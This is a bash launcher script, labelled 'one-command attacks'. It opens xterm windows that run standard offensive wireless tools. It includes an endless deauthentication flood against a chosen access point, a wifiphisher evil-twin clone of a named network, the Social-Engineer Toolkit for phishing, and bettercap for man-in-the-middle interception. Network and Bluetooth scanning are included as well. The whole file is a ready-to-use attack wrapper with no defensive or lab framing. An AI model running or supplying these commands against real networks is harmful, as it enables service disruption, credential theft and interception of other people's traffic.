#!/bin/bash
# CEBRAS Quick Launch - One-command attacks

if [[ $EUID -ne 0 ]]; then
    echo "Must be root!"
    exit 1
fi

case $1 in
    "scan")
        echo "[CEBRAS] Launching network scan..."
        xterm -T "CEBRAS: Network Scan" -e "airodump-ng wlan0mon" &
        ;;
    
    "deauth")
        read -p "Target BSSID: " target
        echo "[CEBRAS] Launching deauth attack..."
        xterm -T "CEBRAS: Deauth Attack" -e "aireplay-ng --deauth 0 -a $target wlan0mon" &
        ;;
    
    "evil")
        read -p "SSID to clone: " ssid
        echo "[CEBRAS] Launching Evil Twin..."
        xterm -T "CEBRAS: Evil Twin" -e "wifiphisher --essid '$ssid'" &
        ;;
    
    "phish")
        echo "[CEBRAS] Launching SET..."
        xterm -T "CEBRAS: SET" -e "setoolkit" &
        ;;
    
    "mitm")
        echo "[CEBRAS] Launching Bettercap..."
        xterm -T "CEBRAS: Bettercap" -e "bettercap -iface wlan0" &
        ;;
    
    "bt")
        echo "[CEBRAS] Launching Bluetooth scan..."
        xterm -T "CEBRAS: Bluetooth" -e "hcitool scan" &
        ;;
    
    *)
        echo "CEBRAS Quick Launch"
        echo "Usage: $0 [attack]"
        echo ""
        echo "Attacks:"
        echo "  scan    - Network discovery"
        echo "  deauth  - Deauth attack"
        echo "  evil    - Evil Twin"
        echo "  phish   - Social Engineering"
        echo "  mitm    - Man-in-the-Middle"
        echo "  bt      - Bluetooth scan"
        ;;
esac